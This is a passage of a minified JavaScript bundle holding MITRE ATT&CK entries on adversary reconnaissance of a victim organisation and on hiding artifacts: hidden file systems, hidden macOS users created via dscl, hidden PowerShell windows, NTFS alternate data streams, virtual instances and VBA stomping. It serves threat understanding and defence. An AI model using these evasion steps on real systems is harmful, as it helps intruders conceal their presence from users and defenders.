reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1596'\u003ESearch Open Technical Databases\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593'\u003ESearch Open Websites\u002FDomains\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1583'\u003EAcquire Infrastructure\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1584'\u003ECompromise Infrastructure\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1133'\u003EExternal Remote Services\u003C\u002Fa\u003E).";uj.external_references=[{source_name:b,external_id:uk,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1590\u002F004"},{source_name:az,url:aA,description:aB}];uj["subtechnique-of"]=_;ul.id=um;ul["object-type"]=a;ul.name="Network Trust Dependencies";ul.description="Adversaries may gather information about the victim's network trust dependencies that can be used during targeting. Information about network trusts may include a variety of details, including second or third-party organizations\u002Fdomains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access.\n\nAdversaries may gather this information in various ways, such as direct elicitation via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E. Information about network trusts may also be exposed to adversaries via online or other accessible data sets (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1596'\u003ESearch Open Technical Databases\u003C\u002Fa\u003E).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.slideshare.net\u002Frootedcon\u002Fcarlos-garca-pentesting-active-directory-forests-rooted2019'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Gathering this information may reveal opportunities for other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1595'\u003EActive Scanning\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593'\u003ESearch Open Websites\u002FDomains\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1583'\u003EAcquire Infrastructure\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1584'\u003ECompromise Infrastructure\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1199'\u003ETrusted Relationship\u003C\u002Fa\u003E).";ul.external_references=[{source_name:b,external_id:um,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1590\u002F003"},{source_name:"Pentesting AD Forests",url:"https:\u002F\u002Fwww.slideshare.net\u002Frootedcon\u002Fcarlos-garca-pentesting-active-directory-forests-rooted2019",description:"García, C. (2019, April 3). Pentesting Active Directory Forests. Retrieved October 20, 2020."}];ul["subtechnique-of"]=_;uq.id=ur;uq["object-type"]=a;uq.name="Business Relationships";uq.description="Adversaries may gather information about the victim's business relationships that can be used during targeting. Information about an organization’s business relationships may include a variety of details, including second or third-party organizations\u002Fdomains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access. This information may also reveal supply chains and shipment paths for the victim’s hardware and software resources.\n\nAdversaries may gather this information in various ways, such as direct elicitation via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E. Information about business relationships may also be exposed to adversaries via online or other accessible data sets (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593\u002F001'\u003ESocial Media\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1594'\u003ESearch Victim-Owned Websites\u003C\u002Fa\u003E).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fthreatpost.com\u002Fbroadvoice-leaks-350m-records-voicemail-transcripts\u002F160158\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Gathering this information may reveal opportunities for other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593'\u003ESearch Open Websites\u002FDomains\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1585'\u003EEstablish Accounts\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1586'\u003ECompromise Accounts\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1195'\u003ESupply Chain Compromise\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1189'\u003EDrive-by Compromise\u003C\u002Fa\u003E, or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1199'\u003ETrusted Relationship\u003C\u002Fa\u003E).";uq.external_references=[{source_name:b,external_id:ur,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1591\u002F002"},{source_name:bH,url:bI,description:bJ}];uq["subtechnique-of"]=aW;us.id=ut;us["object-type"]=a;us.name="Determine Physical Locations";us.description="Adversaries may gather the victim's physical location(s) that can be used during targeting. Information about physical locations of a target organization may include a variety of details, including where key resources and infrastructure are housed. Physical locations may also indicate what legal jurisdiction and\u002For authorities the victim operates within.\n\nAdversaries may gather this information in various ways, such as direct elicitation via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E. Physical locations of a target organization may also be exposed to adversaries via online or other accessible data sets (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1594'\u003ESearch Victim-Owned Websites\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593\u002F001'\u003ESocial Media\u003C\u002Fa\u003E).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fthreatpost.com\u002Fbroadvoice-leaks-350m-records-voicemail-transcripts\u002F160158\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.dobsearch.com\u002Fbusiness-lookup\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Gathering this information may reveal opportunities for other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593'\u003ESearch Open Websites\u002FDomains\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1587'\u003EDevelop Capabilities\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1588'\u003EObtain Capabilities\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566'\u003EPhishing\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1200'\u003EHardware Additions\u003C\u002Fa\u003E).";us.external_references=[{source_name:b,external_id:ut,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1591\u002F001"},{source_name:bH,url:bI,description:bJ},{source_name:un,url:uo,description:up}];us["subtechnique-of"]=aW;uu.id=uv;uu["object-type"]=a;uu.name="Identify Business Tempo";uu.description="Adversaries may gather information about the victim's business tempo that can be used during targeting. Information about an organization’s business tempo may include a variety of details, including operational hours\u002Fdays of the week. This information may also reveal times\u002Fdates of purchases and shipments of the victim’s hardware and software resources.\n\nAdversaries may gather this information in various ways, such as direct elicitation via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E. Information about business tempo may also be exposed to adversaries via online or other accessible data sets (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593\u002F001'\u003ESocial Media\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1594'\u003ESearch Victim-Owned Websites\u003C\u002Fa\u003E).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fthreatpost.com\u002Fbroadvoice-leaks-350m-records-voicemail-transcripts\u002F160158\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Gathering this information may reveal opportunities for other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593'\u003ESearch Open Websites\u002FDomains\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1585'\u003EEstablish Accounts\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1586'\u003ECompromise Accounts\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1195'\u003ESupply Chain Compromise\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1199'\u003ETrusted Relationship\u003C\u002Fa\u003E)";uu.external_references=[{source_name:b,external_id:uv,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1591\u002F003"},{source_name:bH,url:bI,description:bJ}];uu["subtechnique-of"]=aW;uw.id=ux;uw["object-type"]=a;uw.name="Identify Roles";uw.description="Adversaries may gather information about identities and roles within the victim organization that can be used during targeting. Information about business roles may reveal a variety of targetable details, including identifiable information for key personnel as well as what data\u002Fresources they have access to.\n\nAdversaries may gather this information in various ways, such as direct elicitation via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E. Information about business roles may also be exposed to adversaries via online or other accessible data sets (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593\u002F001'\u003ESocial Media\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1594'\u003ESearch Victim-Owned Websites\u003C\u002Fa\u003E).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fthreatpost.com\u002Fbroadvoice-leaks-350m-records-voicemail-transcripts\u002F160158\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Gathering this information may reveal opportunities for other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593'\u003ESearch Open Websites\u002FDomains\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1585'\u003EEstablish Accounts\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1586'\u003ECompromise Accounts\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566'\u003EPhishing\u003C\u002Fa\u003E).";uw.external_references=[{source_name:b,external_id:ux,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1591\u002F004"},{source_name:bH,url:bI,description:bJ}];uw["subtechnique-of"]=aW;uJ.id=uK;uJ["object-type"]=a;uJ.name="Hidden File System";uJ.description="Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.malwaretech.com\u002F2014\u002F11\u002Fvirtual-file-systems-for-beginners.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input\u002Foutput from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.malwaretech.com\u002F2014\u002F11\u002Fvirtual-file-systems-for-beginners.html'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2015\u002F12\u002Ffin1-targets-boot-record.html'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.welivesecurity.com\u002Fwp-content\u002Fuploads\u002F2020\u002F05\u002FESET_Turla_ComRAT.pdf'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Adversaries may also fragment files across the existing file system structure in non-standard ways.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmedia.kasperskycontenthub.com\u002Fwp-content\u002Fuploads\u002Fsites\u002F43\u002F2018\u002F03\u002F08064459\u002FEquation_group_questions_and_answers.pdf'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";uJ.external_references=[{source_name:b,external_id:uK,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1564\u002F005"},{source_name:"MalwareTech VFS Nov 2014",url:"https:\u002F\u002Fwww.malwaretech.com\u002F2014\u002F11\u002Fvirtual-file-systems-for-beginners.html",description:"Hutchins, M. (2014, November 28). Virtual File Systems for Beginners. Retrieved June 22, 2020."},{url:"https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2015\u002F12\u002Ffin1-targets-boot-record.html",description:"Andonov, D., et al. (2015, December 7). Thriving Beyond The Operating System: Financial Threat Group Targets Volume Boot Record. Retrieved May 13, 2016.",source_name:"FireEye Bootkits"},{source_name:"ESET ComRAT May 2020",url:"https:\u002F\u002Fwww.welivesecurity.com\u002Fwp-content\u002Fuploads\u002F2020\u002F05\u002FESET_Turla_ComRAT.pdf",description:"Faou, M. (2020, May). From Agent.btz to ComRAT v4: A ten-year journey. Retrieved June 15, 2020."},{source_name:"Kaspersky Equation QA",description:"Kaspersky Lab's Global Research and Analysis Team. (2015, February). Equation Group: Questions and Answers. Retrieved December 21, 2015.",url:"https:\u002F\u002Fmedia.kasperskycontenthub.com\u002Fwp-content\u002Fuploads\u002Fsites\u002F43\u002F2018\u002F03\u002F08064459\u002FEquation_group_questions_and_answers.pdf"}];uJ["subtechnique-of"]=U;uL.id=uM;uL["object-type"]=a;uL.name="Hidden Files and Directories";uL.description="Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (\u003Ccode\u003Edir \u002Fa\u003C\u002Fcode\u003E for Windows and \u003Ccode\u003Els –a\u003C\u002Fcode\u003E for Linux and macOS).\n\nOn Linux and Mac, users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name  \u003Csup\u003E\u003Ca href='https:\u002F\u002Fresearchcenter.paloaltonetworks.com\u002F2016\u002F09\u002Funit42-sofacys-komplex-os-x-trojan\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.malwarebytes.com\u002Fthreat-analysis\u002F2017\u002F01\u002Fnew-mac-backdoor-using-antiquated-code\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E. Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable.\n\nFiles on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.paloaltonetworks.com\u002Fcontent\u002Fdam\u002Fpan\u002Fen_US\u002Fassets\u002Fpdf\u002Freports\u002FUnit_42\u002Funit42-wirelurker.pdf'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E. On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.\n\nAdversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.";uL.external_references=[{source_name:b,external_id:uM,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1564\u002F001"},{url:bl,description:bm,source_name:bn},{url:ct,description:cu,source_name:cv},{url:nF,description:nG,source_name:nH}];uL["subtechnique-of"]=U;uN.id=uO;uN["object-type"]=a;uN.name="Hidden Users";uN.description="Adversaries may use hidden users to mask the presence of user accounts they create. Every user account in macOS has a userID associated with it. When creating a user, you can specify the userID for that account.\n\nThere is a property value in \u003Ccode\u003E\u002FLibrary\u002FPreferences\u002Fcom.apple.loginwindow\u003C\u002Fcode\u003E called \u003Ccode\u003EHide500Users\u003C\u002Fcode\u003E that prevents users with userIDs 500 and lower from appearing at the login screen. When using the \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1136'\u003ECreate Account\u003C\u002Fa\u003E technique with a userID under 500 (ex: \u003Ccode\u003Esudo dscl . -create \u002FUsers\u002Fusername UniqueID 401\u003C\u002Fcode\u003E) and enabling this property (setting it to Yes), an adversary can conceal user accounts. \u003Csup\u003E\u003Ca href='http:\u002F\u002Fgo.cybereason.com\u002Frs\u002F996-YZT-709\u002Fimages\u002FCybereason-Lab-Analysis-OSX-Pirrit-4-6-16.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E.";uN.external_references=[{source_name:b,external_id:uO,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1564\u002F002"},{url:uA,description:uB,source_name:uC}];uN["subtechnique-of"]=U;uP.id=uQ;uP["object-type"]=a;uP.name="Hidden Window";uP.description="Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. \n\nOn Windows, there are a variety of features in scripting languages in Windows, such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F001'\u003EPowerShell\u003C\u002Fa\u003E, Jscript, and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F005'\u003EVisual Basic\u003C\u002Fa\u003E to make windows hidden. One example of this is \u003Ccode\u003Epowershell.exe -WindowStyle Hidden\u003C\u002Fcode\u003E. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fpowershell\u002Fmodule\u002FMicrosoft.PowerShell.Core\u002FAbout\u002Fabout_PowerShell_exe?view=powershell-5.1'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nSimilarly, on macOS the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be \u003Ccode\u003Eapple.awt.UIElement\u003C\u002Fcode\u003E, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.\n\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.malwarebytes.com\u002Fthreat-analysis\u002F2017\u002F01\u002Fnew-mac-backdoor-using-antiquated-code\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";uP.external_references=[{source_name:b,external_id:uQ,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1564\u002F003"},{source_name:"PowerShell About 2019",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fpowershell\u002Fmodule\u002FMicrosoft.PowerShell.Core\u002FAbout\u002Fabout_PowerShell_exe?view=powershell-5.1",description:"Wheeler, S. et al.. (2019, May 1). About PowerShell.exe. Retrieved October 11, 2019."},{url:ct,description:cu,source_name:cv}];uP["subtechnique-of"]=U;uR.id=uS;uR["object-type"]=a;uR.name="NTFS File Attributes";uR.description="Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file\u002Fdirectory on the partition. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fposts.specterops.io\u002Fhost-based-threat-modeling-indicator-design-a9dbbb53d5ea'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Within MFT entries are file attributes, \u003Csup\u003E\u003Ca href='https:\u002F\u002Fblogs.technet.microsoft.com\u002Faskcore\u002F2010\u002F08\u002F25\u002Fntfs-file-attributes\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). \u003Csup\u003E\u003Ca href='https:\u002F\u002Fposts.specterops.io\u002Fhost-based-threat-modeling-indicator-design-a9dbbb53d5ea'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='http:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Faa364404'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.malwarebytes.com\u002F101\u002F2015\u002F07\u002Fintroduction-to-alternate-data-streams\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fblogs.technet.microsoft.com\u002Faskcore\u002F2013\u002F03\u002F24\u002Falternate-data-streams-in-ntfs\u002F'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. \u003Csup\u003E\u003Ca href='http:\u002F\u002Fjourneyintoir.blogspot.com\u002F2012\u002F12\u002Fextracting-zeroaccess-from-ntfs.html'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.malwarebytes.com\u002F101\u002F2015\u002F07\u002Fintroduction-to-alternate-data-streams\u002F'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";uR.external_references=[{source_name:b,external_id:uS,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1564\u002F004"},{url:"https:\u002F\u002Fposts.specterops.io\u002Fhost-based-threat-modeling-indicator-design-a9dbbb53d5ea",description:"Atkinson, J. (2017, July 18). Host-based Threat Modeling & Indicator Design. Retrieved March 21, 2018.",source_name:"SpectorOps Host-Based Jul 2017"},{url:"https:\u002F\u002Fblogs.technet.microsoft.com\u002Faskcore\u002F2010\u002F08\u002F25\u002Fntfs-file-attributes\u002F",description:"Hughes, J. (2010, August 25). NTFS File Attributes. Retrieved March 21, 2018.",source_name:"Microsoft NTFS File Attributes Aug 2010"},{url:"http:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Faa364404",description:"Microsoft. (n.d.). File Streams. Retrieved December 2, 2014.",source_name:"Microsoft File Streams"},{url:uD,description:uE,source_name:uF},{url:"https:\u002F\u002Fblogs.technet.microsoft.com\u002Faskcore\u002F2013\u002F03\u002F24\u002Falternate-data-streams-in-ntfs\u002F",description:"Marlin, J. (2013, March 24). Alternate Data Streams in NTFS. Retrieved March 21, 2018.",source_name:"Microsoft ADS Mar 2014"},{url:"http:\u002F\u002Fjourneyintoir.blogspot.com\u002F2012\u002F12\u002Fextracting-zeroaccess-from-ntfs.html",description:"Harrell, C. (2012, December 11). Extracting ZeroAccess from NTFS Extended Attributes. Retrieved June 3, 2016.",source_name:"Journey into IR ZeroAccess NTFS EA"},{url:"https:\u002F\u002Foddvar.moe\u002F2018\u002F01\u002F14\u002Fputting-data-in-alternate-data-streams-and-how-to-execute-it\u002F",description:"Moe, O. (2018, January 14). Putting Data in Alternate Data Streams and How to Execute It. Retrieved June 30, 2018.",source_name:"Oddvar Moe ADS1 Jan 2018"},{url:"https:\u002F\u002Foddvar.moe\u002F2018\u002F04\u002F11\u002Fputting-data-in-alternate-data-streams-and-how-to-execute-it-part-2\u002F",description:"Moe, O. (2018, April 11). Putting Data in Alternate Data Streams and How to Execute It - Part 2. Retrieved June 30, 2018.",source_name:"Oddvar Moe ADS2 Apr 2018"},{url:"https:\u002F\u002Fwww.symantec.com\u002Fconnect\u002Farticles\u002Fwhat-you-need-know-about-alternate-data-streams-windows-your-data-secure-can-you-restore",description:"Pravs. (2009, May 25). What you need to know about alternate data streams in windows? Is your Data secure? Can you restore that?. Retrieved March 21, 2018.",source_name:"Symantec ADS May 2009"}];uR["subtechnique-of"]=U;uT.id=uU;uT["object-type"]=a;uT.name="Run Virtual Instance";uT.description="Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance. Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.mci.gov.sg\u002F-\u002Fmedia\u002Fmcicorp\u002Fdoc\u002Freport-of-the-coi-into-the-cyber-attack-on-singhealth-10-jan-2019.ashx'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries). After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fnews.sophos.com\u002Fen-us\u002F2020\u002F05\u002F21\u002Fragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";uT.external_references=[{source_name:b,external_id:uU,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1564\u002F006"},{source_name:"SingHealth Breach Jan 2019",url:"https:\u002F\u002Fwww.mci.gov.sg\u002F-\u002Fmedia\u002Fmcicorp\u002Fdoc\u002Freport-of-the-coi-into-the-cyber-attack-on-singhealth-10-jan-2019.ashx",description:"Committee of Inquiry into the Cyber Attack on SingHealth. (2019, January 10). Public Report of the Committee of Inquiry into the Cyber Attack on Singapore Health Services Private Limited's Patient Database. Retrieved June 29, 2020."},{source_name:uG,url:uH,description:uI}];uT["subtechnique-of"]=U;uV.id=uW;uV["object-type"]=a;uV.name="VBA Stomping";uV.description="Adversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2020\u002F01\u002Fstomp-2-dis-brilliance-in-the-visual-basics.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nMS Office documents with embedded VBA content store source code inside of module streams. Each module stream has a \u003Ccode\u003EPerformanceCache\u003C\u002Fcode\u003E that stores a separate compiled version of the VBA source code known as p-code. The p-code is executed when the MS Office version specified in the \u003Ccode\u003E_VBA_PROJECT\u003C\u002Fcode\u003E stream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application.\u003Csup\u003E\u003Ca href='https:\u002F\u002Foutflank.nl\u002Fblog\u002F2019\u002F05\u002F05\u002Fevil-clippy-ms-office-maldoc-assistant\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fopenspecs\u002Foffice_file_formats\u002Fms-ovba\u002Fef7087ac-3974-4452-aab2-7dba2214d239'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAn adversary may hide malicious VBA code by overwriting the VBA source code location with zero’s, benign code, or random bytes while leaving the previously compiled malicious p-code. Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code. If the VBA source code is removed, some tools might even think that there are no macros present. If there is a version match between the \u003Ccode\u003E_VBA_PROJECT\u003C\u002Fcode\u003E stream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to 